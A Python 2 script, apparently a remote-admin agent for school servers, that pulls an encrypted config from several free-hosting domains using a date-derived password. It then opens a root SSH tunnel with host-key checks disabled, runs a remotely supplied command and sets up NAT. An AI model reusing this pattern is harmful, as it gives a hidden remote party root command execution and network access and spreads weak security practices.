#!/usr/bin/python
# -*- coding: utf-8 -*-

# Fecha creación: 17 jul. 2017
# autor: usuario

import requests
import base64
import tempfile
import time
import socket
import platform
import subprocess
from hashlib import md5
from Crypto.Cipher import AES
from Crypto import Random
from Crypto.Util import Counter
import sys
import os

DEBUG=True

def debug(*mensa):
    global DEBUG
    if DEBUG:
        imprimir=""
        for m in mensa:
            imprimir+=m
    print imprimir

def pid_exists(pid):
    import errno
    """Check whether pid exists in the current process table.
    UNIX only.
    """
    try:
        pid=int(pid)
    except:
        return False
    if pid < 0:
        return False
    if pid == 0:
        # According to "man 2 kill" PID 0 refers to every process
        # in the process group of the calling process.
        # On certain systems 0 is a valid PID but we have no way
        # to know that in a portable fashion.
        raise ValueError('invalid PID 0')
    try:
        os.kill(pid, 0)
    except os.error as err:
        if err.errno == errno.ESRCH:
            # ESRCH == No such process
            return False
        elif err.errno == errno.EPERM:
            # EPERM clearly means there's a process to deny access to
            return True
        else:
            # According to "man 2 kill" possible error values are
            # (EINVAL, EPERM, ESRCH)
            raise
    else:
        return True
    
def conexionActiva(host):
    nPings=4; timeout=2
    # Ping parameters as function of OS
    if (platform.system().lower()=="windows"): parameters = "-n "+str(nPings)+" -w "+str(timeout)
    else: parameters = "-c "+str(nPings)+" -W "+str(timeout)
    cmd=['ping',parameters,host]
    # Pinging
    #return os.system("ping " + parameters + " " + host) == 0
    return subprocess.Popen(cmd).wait()==0

def hostname():
    return socket.gethostname().split(".")[0]

def derive_key_and_iv(password, salt, key_length, iv_length):
    d = d_i = ''
    while len(d) < key_length + iv_length:
        d_i = md5(d_i + password + salt).digest()
        d += d_i
    return d[:key_length], d[key_length:key_length+iv_length]


def base64Dec(inf,outf):
    inf=open(inf,"r")
    outf=open(outf,"wb")
    base64.decode(inf,outf)
    #for l in inf:
    #    outf.write(base64.b64decode(l))
    #outf.close()
    #inf.close()

def base64Enc(inf,outf):
    inf=open(inf,"r")
    outf=open(outf,"wb")
    base64.encode(inf,outf)
    #for l in inf:
    #    outf.write(base64.b64encode(l)+"\n")
    #outf.close()
    #inf.close()


def encryptCTR(inf, outf, password, key_length=32, base64=True,padding=False):
    bs = AES.block_size
    salt = Random.new().read(bs - len('Salted__'))
    key, iv = derive_key_and_iv(password, salt, key_length, bs)
    ctr=Counter.new(bs*8,initial_value=long(iv.encode("hex"),16))
    cipher = AES.new(key, AES.MODE_CTR, counter = ctr)
    in_file=open(inf,"r")
    out_file=open(outf,"w")
    out_file.write('Salted__' + salt)
    finished = False
    while not finished:
        chunk = in_file.read(1024 * bs)
        if len(chunk) == 0 or len(chunk) % bs != 0:
            if (padding):
                padding_length = (bs - len(chunk) % bs) or bs
                chunk += padding_length * chr(padding_length)
            finished = True
        out_file.write(cipher.encrypt(chunk))
    in_file.close()
    out_file.close()
    if (base64):
        tmpFile=tempfile.mktemp()
        base64Enc(outf,tmpFile)
        os.remove(outf)
        os.rename(tmpFile,outf)

def decryptCTR(in_file="/tmp/indice6.html", out_file=None, 
               password="clave"+time.strftime("%Y-%m-%d"), key_length=32,
               base64=True,padding=False):
    if (base64):
        tmpFile=tempfile.mktemp()
        base64Dec(in_file,tmpFile)
        in_file=tmpFile
    in_file=open(in_file,"rb")
    if (out_file==None):
        out_file=sys.stdout
    else:
        out_file=open(out_file,"w")
    bs = AES.block_size
    salt = in_file.read(bs)[len('Salted__'):]
    key, iv = derive_key_and_iv(password, salt, key_length, bs)
    #print "key: "+key.encode("hex")
    #print "iv: "+iv.encode("hex")
    #sys.exit(0)
    ctr=Counter.new(bs*8,initial_value=long(iv.encode("hex"),16))
    cipher = AES.new(key, AES.MODE_CTR, counter = ctr)
    next_chunk = ''
    finished = False
    while not finished:
        chunk, next_chunk = next_chunk, cipher.decrypt(in_file.read(1 * bs))
        if len(next_chunk) == 0:
            if (padding):
                padding_length = ord(chunk[-1])
                chunk = chunk[:-padding_length]
            finished = True
        out_file.write(chunk)
    in_file.close()
    if (out_file!=sys.stdout):
       out_file.close()


def obtenerFicheroIndice(urls=None,salida=None):
    indice="indice6.html"
    if (urls==None):
        urls=["http://ganimedes.atwebpages.com/", "https://ganimedes.000webhostapp.com/","http://scratch.hol.es/","http://xyz.hit.to/",
          "http://ubuin.hopto.org/","http://ganimedes.esy.es/"]
    for url in urls:
        try: 
            r=requests.get(url+indice);  
            break
        except: r=None
            
    if (r==None or r.status_code!=200):
        return "Error"
    outfile = tempfile.mktemp()
    out=open(outfile,"w")
    out.write(r.content)
    out.close()
    #return encryptDecryptCtr256Shell(r.content,"clave"+time.strftime("%Y-%m-%d"),'d',hostname())
    return decryptCTR(outfile,salida)

def psutilMata(dev):
    import psutil,os,signal,time
    encontrado=False
    for pid in psutil.pids():
        p=psutil.Process(pid)
        if ("ssh" in p.name() and " -w "+str(dev) in " ".join(p.cmdline())):
            encontrado=True
            break
    if (not encontrado):
        return
    cont=0
    while (pid in psutil.pids() and cont<20):
        if (cont<10):
            #print "Enviando SIGTERM a "+str(pid)
            os.kill(pid,signal.SIGTERM)
        else:
            #print "Enviando SIGKILL a "+str(pid)
            os.kill(pid,signal.SIGKILL)
        cont+=1
        time.sleep(1) 
            

def commandsMata(dev):
    import commands, signal
    #proc = subprocess.Popen(["pgrep", process_name], stdout=subprocess.PIPE) 
    cont=0
    while True:
        #err,out=commands.getstatusoutput("ps awwx | grep -i ssh | grep '\-w' | grep -v grep")
        err,out=commands.getstatusoutput("pgrep -u root -f 'ssh.*-w"+str(dev)+"'")
        print "err: "+str(err)+"out: "+str(out)
        if (err==0 and out!=""):
            if (cont<10):
                os.kill(int(out),signal.SIGTERM)
            else:
                os.kill(int(out),signal.SIGKILL)
        else:
            break 
        cont+=1  

def mata(dev):
    try:
        import psutil
        psutilMata(dev)
    except:
        commandsMata(dev)        

def procesarParametros():
    from collections import OrderedDict
    tmpFile=tempfile.mktemp()
    obtenerFicheroIndice(salida=tmpFile)
    fp=open(tmpFile,"r")
    h=hostname()
    if DEBUG: h="aula1srv"
    res=OrderedDict()
    for p in fp:
        if (p[-1]=="\n"): p=p[:-1]
        if (p.startswith("GLOBAL") or p.startswith(h)):
            lp=p.split("=")
            res[lp[0]]=lp[1]
    fp.close()
    #quitar comillas dobles
    for k in res.keys():
        res[k]=res[k].replace('"','')
    for k in res.keys():
        for k2,v in res.iteritems():
            var="$"+k
            if var in v:
                pos=v.find(var)
                if (pos+len(var)<len(v) and (v[pos+len(var)].isalpha() or v[pos+len(var)] in "_-")):
                    pass
                else:
                    res[k2]=res[k2].replace(var,res[k])
    parametros={}
    for k in res.keys():
        if k.startswith("GLOBAL"):
            parametros[k]=res[k]
    try:
        parametros['TUN_SSH']=res[h+"_TUN_SSH"]
        parametros['TUN_SSH_IP']=res[h+"_TUN_SSH_IP"]
        parametros['TUN_SSH_PORT']=res[h+"_TUN_SSH_PORT"]
        parametros['TUN_SSH_DEV']=res[h+"_TUN_SSH_DEV"]
        parametros['TUN_SSH_DEV_IP']=res[h+"_TUN_SSH_DEV_IP"]
        parametros['TUN_SSH_DEV_GW']=res[h+"_TUN_SSH_RED"]+".1"
        parametros['TUN_SSH_CMD']=res[h+"_TUN_SSH_CMD"]
    except:
        pass
    return parametros

def md5Lineas(file,numLineas):
    f=open(file,"r")
    lineas=""
    cont=1
    for l in f:
        lineas+=l
        cont+=1
        if (cont>numLineas): break
    f.close()    
    return md5(lineas).digest().encode("hex")        

def username():
    import getpass
    return getpass.getuser()

def tunelSSH(parametros):
    commands=[]
    commands.append("/usr/bin/ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o ConnectTimeout=10 -p "+parametros['TUN_SSH_PORT']+" root@"+parametros['TUN_SSH_IP']+" -w "+parametros['TUN_SSH_DEV']+":"+parametros['TUN_SSH_DEV']+" -CTf bash -c \'/bin/ls; /bin/sleep 5; /sbin/ifconfig tun"+parametros['TUN_SSH_DEV']+"  "+parametros['TUN_SSH_DEV_GW']+"/24 pointopoint "+parametros['TUN_SSH_DEV_IP']+" up; /bin/sleep 3; "+parametros['TUN_SSH_CMD']+" \'")
    commands.append("/sbin/ifconfig tun"+parametros['TUN_SSH_DEV']+" "+parametros['TUN_SSH_DEV_IP']+"/24 pointopoint "+parametros['TUN_SSH_DEV_GW']+" up &> /dev/null")
    commands.append("/sbin/iptables -t nat -D POSTROUTING -j MASQUERADE -s 10."+parametros['TUN_SSH_DEV']+"."+parametros['TUN_SSH_DEV']+".0/24 &> /dev/null")
    commands.append("/sbin/iptables -t nat -A POSTROUTING -j MASQUERADE -s 10."+parametros['TUN_SSH_DEV']+"."+parametros['TUN_SSH_DEV']+".0/24")
    for i in range(1,2):
        for c in commands:
            print c
            os.system(c)

def main():
    usuario=username()
    if DEBUG: usuario="root"
    if (usuario!="root" and not usuario.lower().startswith("admin")):
        print "Debes ejecutar este programa como administrador."
        sys.exit(1)
    pidfile=tempfile.gettempdir()+"/"+md5(os.path.basename(sys.argv[0])).digest().encode("hex")
    if (os.path.isfile(pidfile)):
        pid=open(pidfile,"r").read();
        if (pid_exists(pid)): sys.exit(2)
        else: os.remove(pidfile)
    
    pdf=open(pidfile,"w"); pdf.write(str(os.getpid())); pdf.close()
    
    horaComienzo=time.strftime("%H")
    conexionEstablecida=False
    while (horaComienzo==time.strftime("%H")):
        parametros={}
        if (not conexionEstablecida):
            parametros=procesarParametros()
        conexionEstablecida=False
        if (len(parametros)>0 and parametros['TUN_SSH']=="si"):
            if (conexionActiva(parametros['TUN_SSH_DEV_GW'])):
                conexionEstablecida=True
            else:
                mata(parametros['TUN_SSH_DEV'])
                tunelSSH(parametros)
        print "Durmiendo"
        try:
            time.sleep(int(parametros['GLOBAL_ESPERA']))
        except:
            time.sleep(300) 
            
             
if ( __name__ == '__main__'):    
    main()

